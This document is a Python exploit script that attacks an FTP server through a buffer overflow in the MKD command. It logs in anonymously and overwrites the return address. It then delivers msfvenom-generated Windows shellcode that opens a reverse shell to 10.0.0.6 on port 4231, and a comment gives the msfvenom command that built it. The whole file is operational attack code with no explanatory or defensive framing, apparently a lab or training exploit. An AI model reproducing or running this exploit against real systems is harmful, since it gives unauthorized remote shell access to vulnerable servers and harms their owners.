#!/etc/python

import socket, sys, os, struct

host = "10.0.0.9"
port = 21

"""
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=4231 -f c -b \x00\x0A\x0D
Payload size: 351 bytes
"""

sc = ("\xbd\x09\xe8\xbf\x15\xdd\xc1\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x6b\x12\x03\x6b\x12\x83\xca\xec\x5d\xe0\x30\x04\x23"
"\x0b\xc8\xd5\x44\x85\x2d\xe4\x44\xf1\x26\x57\x75\x71\x6a\x54"
"\xfe\xd7\x9e\xef\x72\xf0\x91\x58\x38\x26\x9c\x59\x11\x1a\xbf"
"\xd9\x68\x4f\x1f\xe3\xa2\x82\x5e\x24\xde\x6f\x32\xfd\x94\xc2"
"\xa2\x8a\xe1\xde\x49\xc0\xe4\x66\xae\x91\x07\x46\x61\xa9\x51"
"\x48\x80\x7e\xea\xc1\x9a\x63\xd7\x98\x11\x57\xa3\x1a\xf3\xa9"
"\x4c\xb0\x3a\x06\xbf\xc8\x7b\xa1\x20\xbf\x75\xd1\xdd\xb8\x42"
"\xab\x39\x4c\x50\x0b\xc9\xf6\xbc\xad\x1e\x60\x37\xa1\xeb\xe6"
"\x1f\xa6\xea\x2b\x14\xd2\x67\xca\xfa\x52\x33\xe9\xde\x3f\xe7"
"\x90\x47\x9a\x46\xac\x97\x45\x36\x08\xdc\x68\x23\x21\xbf\xe4"
"\x80\x08\x3f\xf5\x8e\x1b\x4c\xc7\x11\xb0\xda\x6b\xd9\x1e\x1d"
"\x8b\xf0\xe7\xb1\x72\xfb\x17\x98\xb0\xaf\x47\xb2\x11\xd0\x03"
"\x42\x9d\x05\x83\x12\x31\xf6\x64\xc2\xf1\xa6\x0c\x08\xfe\x99"
"\x2d\x33\xd4\xb1\xc4\xce\xbf\x3d\x12\xd1\x54\x56\x21\xd1\xba"
"\x21\xac\x37\xd0\x3d\xf9\xe0\x4d\xa7\xa0\x7a\xef\x28\x7f\x07"
"\x2f\xa2\x8c\xf8\xfe\x43\xf8\xea\x97\xa3\xb7\x50\x31\xbb\x6d"
"\xfc\xdd\x2e\xea\xfc\xa8\x52\xa5\xab\xfd\xa5\xbc\x39\x10\x9f"
"\x16\x5f\xe9\x79\x50\xdb\x36\xba\x5f\xe2\xbb\x86\x7b\xf4\x05"
"\x06\xc0\xa0\xd9\x51\x9e\x1e\x9c\x0b\x50\xc8\x76\xe7\x3a\x9c"
"\x0f\xcb\xfc\xda\x0f\x06\x8b\x02\xa1\xff\xca\x3d\x0e\x68\xdb"
"\x46\x72\x08\x24\x9d\x36\x38\x6f\xbf\x1f\xd1\x36\x2a\x22\xbc"
"\xc8\x81\x61\xb9\x4a\x23\x1a\x3e\x52\x46\x1f\x7a\xd4\xbb\x6d"
"\x13\xb1\xbb\xc2\x14\x90")

pre = "\x41" * 247
eip = struct.pack('<L', 0x7E429353)
nop = struct.pack('<L', 0x90909090) * 5
pad = "\x43" * (1000 - len(pre + eip + nop + sc)) 

buffer = pre + eip + nop + sc + pad

payload = "MKD " + buffer + "\r\n"

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((host,port))
exploit.recv(1024)
exploit.send("USER anonymous\r\n")
exploit.recv(1024)
exploit.send("PASS anonymous\r\n")
exploit.recv(1024)
exploit.send(payload)
exploit.recv(1024)
exploit.send("QUIT\r\n")
exploit.close()
